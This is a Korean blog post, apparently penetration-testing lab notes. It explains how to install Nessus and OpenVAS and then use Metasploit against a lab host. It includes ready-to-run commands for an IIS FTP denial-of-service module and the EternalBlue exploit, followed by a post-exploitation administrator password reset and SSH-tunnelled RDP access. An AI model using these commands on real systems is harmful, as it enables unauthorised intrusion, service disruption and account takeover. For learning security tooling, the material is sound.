---
layout: post
title: "취약점 스캐너 (Nessus & OpenVAS)"
date: 2025-11-06 17:00:00 +0900
categories: [hacking-tools]
---

## 1. 개요

취약점 스캐너는 시스템, 네트워크, 웹 애플리케이션의 보안 취약점을 자동으로 탐지하는 도구입니다. 모의해킹의 정보 수집 단계에서 핵심적인 역할을 합니다.

| 도구 | 유형 | 라이선스 | 특징 |
|------|------|----------|------|
| **Nessus** | 상용 (Essentials 무료) | 유료/제한적 무료 | 업계 표준, 빠른 스캔, 직관적 UI |
| **OpenVAS** | 오픈소스 | 무료 (GPL) | GVM의 일부, 커뮤니티 기반 |

---

## 2. Nessus

### 설치 (Kali Linux)

```bash
# 패키지 다운로드
curl --request GET \
  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.10.1-debian10_amd64.deb' \
  --output 'Nessus-10.10.1-debian10_amd64.deb'

# 설치
dpkg -i Nessus-10.10.1-debian10_amd64.deb

# 서비스 시작
systemctl enable --now nessusd
```

### 초기 설정

1. 브라우저에서 `https://<IP>:8834/` 접속
2. Activation Code 입력 (Tenable 웹사이트에서 무료 발급)
3. 관리자 계정 생성 후 플러그인 자동 다운로드 (약 10~30분 소요)

### 스캔 수행

1. **New Scan** → **Basic Network Scan** 선택
2. Target에 스캔 대상 IP 입력 (예: `10.0.0.31`)
3. 스캔 완료 후 취약점 목록 확인
4. 심각도별(Critical, High, Medium, Low) 분류된 결과 분석

### Metasploit 연동

Nessus에서 탐지된 취약점을 Metasploit으로 공격할 수 있습니다.

```bash
msfconsole

# 예: IIS FTP 취약점 (MS11-004) 검증
search ms11-004
use auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof
set RHOSTS 10.0.0.31
run
```

---

## 3. OpenVAS (GVM)

### 설치 (Kali Linux)

```bash
# GVM(Greenbone Vulnerability Manager) 설치
apt-get install -y gvm

# 초기 설정 (시간 소요)
gvm-setup
```

초기 설정 완료 시 admin 비밀번호가 출력됩니다:
```
[*] User created with password '61996a5a-eab3-4175-a703-9b872db709f7'.
```

### 비밀번호 재설정

```bash
gvm-stop

# PostgreSQL 접속
sudo -u postgres psql gvmd

# 비밀번호 변경
UPDATE users SET password = crypt('newpassword', gen_salt('bf')) WHERE name = 'admin';
\q

gvm-start
```

### 서비스 확인 및 시작

```bash
# 설정 검증
gvm-check-setup

# 서비스 시작
gvm-start
```

### 웹 인터페이스 접속

- URL: `https://localhost:9392`
- 기본 계정: admin / (설정 시 출력된 비밀번호)

---

## 4. EternalBlue (MS17-010) 익스플로잇

취약점 스캐너로 탐지 후 Metasploit으로 공격하는 예시입니다.

```bash
msfconsole

# EternalBlue 검색
search ms17-010

# 익스플로잇 선택
use exploit/windows/smb/ms17_010_eternalblue

# 옵션 확인
options

# 대상 설정
set RHOSTS 10.0.0.31
run
```

### 성공 시 (Meterpreter 획득)

```
[*] Meterpreter session 1 opened
meterpreter > shell
C:\Windows\system32> net user administrator NewPassword123!
```

---

## 5. SSH 터널링을 통한 RDP 접속

내부망 서버에 직접 접근이 불가할 때 SSH 터널을 통해 우회합니다.

```bash
# Terminal 1: SSH 터널 생성
ssh -L 9999:10.0.0.31:3389 vagrant@10.0.0.31

# Terminal 2: 터널 상태 확인
ss -nat | grep 9999

# Terminal 2: RDP 연결
rdesktop -u vagrant -p vagrant -k ko 127.0.0.1:9999
```

---

## 6. 실시간 네트워크 모니터링 (Sysinternals)

Windows 환경에서 공격 탐지용으로 활용합니다.

- **TCPView**: 실시간 TCP/UDP 연결 모니터링
- **Process Explorer**: 프로세스별 네트워크 연결 확인

```
# 다운로드
https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview

# 실행
tcpview64.exe
```

공격 발생 시 의심스러운 연결(비정상 포트, 외부 IP)을 즉시 확인할 수 있습니다.

<hr class="short-rule">
